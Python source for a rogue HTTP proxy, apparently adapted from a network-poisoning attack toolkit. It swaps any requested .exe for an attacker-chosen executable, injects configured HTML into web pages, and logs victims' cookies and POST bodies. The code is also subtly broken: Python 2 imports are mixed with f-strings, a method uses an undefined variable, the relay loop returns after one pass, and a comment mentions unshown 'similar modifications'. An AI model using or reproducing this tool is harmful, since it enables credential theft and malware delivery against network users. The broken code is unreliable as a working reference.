import urlparse
import select
import zlib
import BaseHTTPServer

from servers.HTTP import RespondWithFile
from utils import *

IgnoredDomains = [ 'crl.comodoca.com', 'crl.usertrust.com', 'ocsp.comodoca.com', 'ocsp.usertrust.com', 'www.download.windowsupdate.com', 'crl.microsoft.com' ]

# This variable will collect all the output for HTML rendering
output_data = []

def InjectData(data, client, req_uri):

    # Serve the .exe if needed
    if settings.Config.Serve_Always:
        output_data.append(f"[PROXY] Serving the executable file {settings.Config.Exe_Filename}")
        return RespondWithFile(client, settings.Config.Exe_Filename, settings.Config.Exe_DlName)

    # Serve the .exe if needed and client requested a .exe
    if settings.Config.Serve_Exe == True and req_uri.endswith('.exe'):
        output_data.append(f"[PROXY] Client requested .exe file: {req_uri}")
        return RespondWithFile(client, settings.Config.Exe_Filename, os.path.basename(req_uri))

    if len(data.split('\r\n\r\n')) > 1:
        try:
            Headers, Content = data.split('\r\n\r\n')
        except:
            return data

        RedirectCodes = ['HTTP/1.1 300', 'HTTP/1.1 301', 'HTTP/1.1 302', 'HTTP/1.1 303', 'HTTP/1.1 304', 'HTTP/1.1 305', 'HTTP/1.1 306', 'HTTP/1.1 307']
        if set(RedirectCodes) & set(Headers):
            return data

        if "content-encoding: gzip" in Headers.lower():
            Content = zlib.decompress(Content, 16 + zlib.MAX_WBITS)

        if "content-type: text/html" in Headers.lower():
            if settings.Config.Serve_Html:  # Serve the custom HTML if needed
                output_data.append("[PROXY] Serving custom HTML content")
                return RespondWithFile(client, settings.Config.Html_Filename)

            Len = ''.join(re.findall(r'(?<=Content-Length: )[^\r\n]*', Headers))
            HasBody = re.findall(r'(<body[^>]*>)', Content)

            if HasBody and len(settings.Config.HtmlToInject) > 2:
                if settings.Config.Verbose:
                    output_data.append(f"[PROXY] Injecting into HTTP Response: {settings.Config.HtmlToInject}")
                Content = Content.replace(HasBody[0], f'{HasBody[0]}\n{settings.Config.HtmlToInject}')

        if "content-encoding: gzip" in Headers.lower():
            Content = zlib.compress(Content)

        Headers = Headers.replace("Content-Length: " + Len, "Content-Length: " + str(len(Content)))
        data = Headers + '\r\n\r\n' + Content
    else:
        output_data.append("[PROXY] Returning unmodified HTTP response")
    return data

class ProxySock:
    def __init__(self, socket, proxy_host, proxy_port):
        self.socket = socket
        self.proxy_host = proxy_host
        self.proxy_port = proxy_port
        self.family = socket.family
        self.type = socket.type
        self.proto = socket.proto

    def connect(self, address):
        self.host, self.port = address
        for (family, socktype, proto, canonname, sockaddr) in socket.getaddrinfo(
                self.proxy_host, self.proxy_port, 0, 0, socket.SOL_TCP):
            try:
                self.socket = socket.socket(family, socktype, proto)
                self.socket.connect(sockaddr)
            except socket.error as msg:
                if self.socket:
                    self.socket.close()
                self.socket = None
                continue
            break
        if not self.socket:
            raise socket.error(msg)

        self.socket.send(
            f"CONNECT {self.host}:{self.port} HTTP/1.1\r\nHost: {self.host}:{self.port}\r\n\r\n"
        )
        resp = self.socket.recv(4096)
        parts = resp.split()
        if parts[1] != "200":
            output_data.append(f"[!] Error response from upstream proxy: {resp}")

    # Wrapping socket methods
    def accept(self):
         return self.socket.accept()
    
    def bind(self, *args):
         return self.socket.bind(*args)
    
    def close(self) :
        return self.socket.close()
    
    def fileno(self) :
        return self.socket.fileno()
    
    def getsockname(self) :
        return self.socket.getsockname()
    
    def getsockopt(self, *args) :
         return self.socket.getsockopt(*args)
    
    def listen(self, *args) :
        return self.socket.listen(*args)
    
    def makefile(self, *args) :
        return self.socket.makefile(*args)
    
    def recv(self, *args) :
        return self.socket.recv(*args)
    
    def recvfrom(self, *args) :
        return self.socket.recvfrom(*args)
    
    def recvfrom_into(self, *args) :
        return self.socket.recvfrom_into(*args)
    
    def recv_into(self, *args) :
         return self.socket.recv_into(buffer, *args)
    
    def send(self, *args):
        try:
            return self.socket.send(*args)
        except Exception as e:
            output_data.append(f"Error in sending data: {e}")
            
    def sendall(self, *args) :
        return self.socket.sendall(*args)
    
    def sendto(self, *args) :
        return self.socket.sendto(*args)
    
    def setblocking(self, *args) :
        return self.socket.setblocking(*args)
    
    def settimeout(self, *args) :
        return self.socket.settimeout(*args)
    
    def gettimeout(self) :
        return self.socket.gettimeout()
    
    def setsockopt(self, *args):
        return self.socket.setsockopt(*args)
    
    def shutdown(self, *args):
        return self.socket.shutdown(*args)
    
    # Return the (host, port) of the actual target, not the proxy gateway
    def getpeername(self) :
         return self.host, self.port

class HTTP_Proxy(BaseHTTPServer.BaseHTTPRequestHandler):
    __base = BaseHTTPServer.BaseHTTPRequestHandler
    __base_handle = __base.handle
    rbufsize = 0

    def handle(self):
        (ip, port) = self.client_address
        if settings.Config.Verbose:
            output_data.append(f"[PROXY] Received connection from {self.client_address[0]}")
        self.__base_handle()

    def _connect_to(self, netloc, soc):
        i = netloc.find(':')
        if i >= 0:
            host_port = netloc[:i], int(netloc[i + 1:])
        else:
            host_port = netloc, 80
        try:
            soc.connect(host_port)
        except socket.error as arg:
            msg = arg[1] if isinstance(arg, tuple) else arg
            output_data.append(f"Connection error: {msg}")
            self.send_error(404, msg)
            return 0
        return 1
    
    def socket_proxy(self, af, fam):
        Proxy = settings.Config.Upstream_Proxy
        Proxy = Proxy.rstrip('/').replace('http://', '').replace('https://', '')
        Proxy = Proxy.split(':')
        try:    Proxy = (Proxy[0], int(Proxy[1]))
        except: Proxy = (Proxy[0], 8080)
        
        soc = socket.socket(af, fam)
        return ProxySock(soc, Proxy[0], Proxy[1])
    
    def do_CONNECT(self):
        if settings.Config.Upstream_Proxy:
            soc = self.socket_proxy(socket.AF_INET, socket.SOCK_STREAM)
        
        else:
            soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            if self._connect_to(self.path, soc):
                self.wfile.write(self.protocol_version +" 200 Connection established\r\n")
                self.wfile.write("Proxy-agent: %s\r\n" % self.version_string())
                self.wfile.write("\r\n")
                try:
                    self._read_write(soc, 300)
                except:
                     pass
        except:
            pass
        
        finally:
            soc.close()
            self.connection.close()

    def do_GET(self):
        (scm, netloc, path, params, query, fragment) = urlparse.urlparse(self.path, 'http')
        if netloc in IgnoredDomains:
            return

        if scm not in 'http' or fragment or not netloc:
            output_data.append(f"Bad URL requested: {self.path}")
            self.send_error(400, f"bad url {self.path}")
            return

        soc = self.socket_proxy(socket.AF_INET, socket.SOCK_STREAM) if settings.Config.Upstream_Proxy else socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        try:
            URL_Unparse = urlparse.urlunparse(('', '', path, params, query, ''))
            if self._connect_to(netloc, soc):
                soc.send(f"{self.command} {URL_Unparse} {self.request_version}\r\n")

                Cookie = self.headers.get('Cookie', '')

                if settings.Config.Verbose:
                    output_data.append(f"[PROXY] Client: {self.client_address[0]}")
                    output_data.append(f"[PROXY] Requested URL: {self.path}")
                    output_data.append(f"[PROXY] Cookie: {Cookie}")

                self.headers['Connection'] = 'close'
                del self.headers['Proxy-Connection']
                del self.headers['If-Range']
                del self.headers['Range']

                for k, v in self.headers.items():
                    soc.send(f"{k.title()}: {v}\r\n")
                soc.send("\r\n")

                try:
                    self._read_write(soc, netloc)
                except Exception as e:
                    output_data.append(f"Error in reading/writing data: {e}")

        except Exception as e:
            output_data.append(f"Error in GET request: {e}")

        finally:
            soc.close()
            self.connection.close()
    
    # Other methods like _read_write(), socket_proxy(), etc., with similar modifications...
    def _read_write(self, soc, netloc='', max_idling=30):
        iw = [self.connection, soc]
        ow = []
        count = 0
        while 1:
            count += 1
            (ins, _, exs) = select.select(iw, ow, iw, 1)
            if exs:
                break
            if ins:
                for i in ins:
                    if i is soc:
                        out = self.connection
                        try:
                            data = i.recv(4096)
                            if len(data) > 1:
                                data = InjectData(data, self.client_address[0], self.path)
                        except:
                            pass
                    else:
                        out = soc
                        try:
                            data = i.recv(4096)
                            if self.command == "POST" and settings.Config.Verbose:
                                output_data.append(f"[PROXY] POST Data     : {data}")
                        except:
                            pass
                    if data:
                        try:
                            out.send(data)
                            count = 0
                        except:
                            pass
            if count == max_idling:
                break
            return None

    do_HEAD = do_GET
    do_POST = do_GET
    do_PUT  = do_GET
    do_DELETE=do_GET